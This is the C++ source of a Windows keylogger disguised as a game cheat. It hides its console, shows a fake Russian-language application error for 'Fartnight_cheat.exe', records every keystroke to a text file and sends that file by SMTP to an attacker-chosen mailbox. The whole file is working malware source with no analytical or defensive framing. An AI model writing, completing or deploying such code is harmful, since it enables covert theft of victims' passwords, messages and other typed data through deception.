// compile with: /clr  
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <winreg.h>
#using <System.dll>
#pragma comment(lib, "user32.lib")

using namespace System;
using namespace System::Net;
using namespace System::Net::Mail;
using namespace System::Net::Mime;
using namespace System::Threading;
using namespace System::ComponentModel;
using namespace Microsoft::Win32;

void sendmail()
{
	SmtpClient^ owo = gcnew SmtpClient("smtp.mail.ru", 25);
	owo->Credentials = gcnew NetworkCredential("your_mail", "your_password");
	owo->EnableSsl = true;
	MailMessage^ mail = gcnew MailMessage();
	mail->From = gcnew MailAddress("your_mail");
	mail->To->Add(gcnew MailAddress("which_mail_you_want_to_send"));
	mail->Subject = "Theme";
	mail->Body = "uwu";
	String^ rofl = L"rofl.txt";
	Attachment^ uwu = gcnew Attachment(rofl, MediaTypeNames::Application::Octet);
	mail->Attachments->Add(uwu);
	owo->Send(mail);
}

void hidenerror()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	MessageBox(0, L"Ошибка при запуске приложения (0xc00007b). Для выхода из приложения нажмите кнопку ''ОК''", L"Fartnight_cheat.exe - Ошибка приложения", MB_OK | MB_ICONSTOP);//write here anything   you want(MB_ICONSTOP = error icon)
}

void keylog(std::ofstream &txt)
{
	while (true)
	{
		Sleep(1);
		for (size_t button = 1; button < 128; button++)
		{
			if (GetAsyncKeyState(button) == -32767)
			{
				switch (button)//was taken from http://www.vsokovikov.narod.ru/New_MSDN_API/Other/virtual_key_code.htm
				{
				case 1:
					txt << "<left_m>";
					break;
				case 2:
					txt << "<right_m>";
					break;
				case 4:
					txt << "<middle_m>";
					break;
				case 8:
					txt << "<Backspace>";
					break;
				case VK_SHIFT:
					txt << "<Shift>";
					break;
				case VK_CONTROL:
					txt << "<Ctrl>";
					break;
				case VK_MENU:
					txt << "<Alt>";
					break;
				case VK_CAPITAL:
					txt << "<Caps_Lock>";
					break;
				case VK_RETURN:
					txt << std::endl << "<Enter>" << std::endl;
					break;
				case VK_SPACE:
					txt << "< >";
					break;
				case VK_SNAPSHOT:
					txt << "<PrtSc>";
					break;
				case 0x21: //VK_PRIOR
					txt << "<Page_Up>";
					break;
				case VK_NEXT:
					txt << "<Page_Down>";
					break;
				case VK_TAB:
					txt << "<Tab>";
					break;
				case VK_DELETE:
					txt << "<Delete>";
					break;
				case VK_ESCAPE:
					txt << "<Esc>";
					break;
				case VK_F1:
					txt << "<F1>";
					break;
				case VK_F2:
					txt << "<F2>";
					break;
				case VK_F3:
					txt << "<F3>";
					break;
				case VK_F4:
					txt << "<F4>";
					break;
				case VK_F5:
					txt << "<F5>";
					break;
				case VK_F6:
					txt << "<F6>";
					break;
				case VK_F7:
					txt << "<F7>";
					break;
				case VK_F8:
					txt << "<F8>";
					break;
				case VK_F9:
					txt << "<F9>";
					break;
				case VK_F10:
					txt << "<F10>";
					break;
				case VK_F11:
					txt << "<F11>";
					break;
				case VK_F12:
					txt << "<F12>";
					break;
				default:
					txt << char(button);
					break;
				}
			}
		}
	}
}

int main(array<System::String ^> ^args)
{
	HANDLE H = CreateMutex(NULL, true, L"kekw");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 0;
	}

	sendmail();

	hidenerror();

	std::ofstream txt("rofl.txt");

	keylog(txt);
}
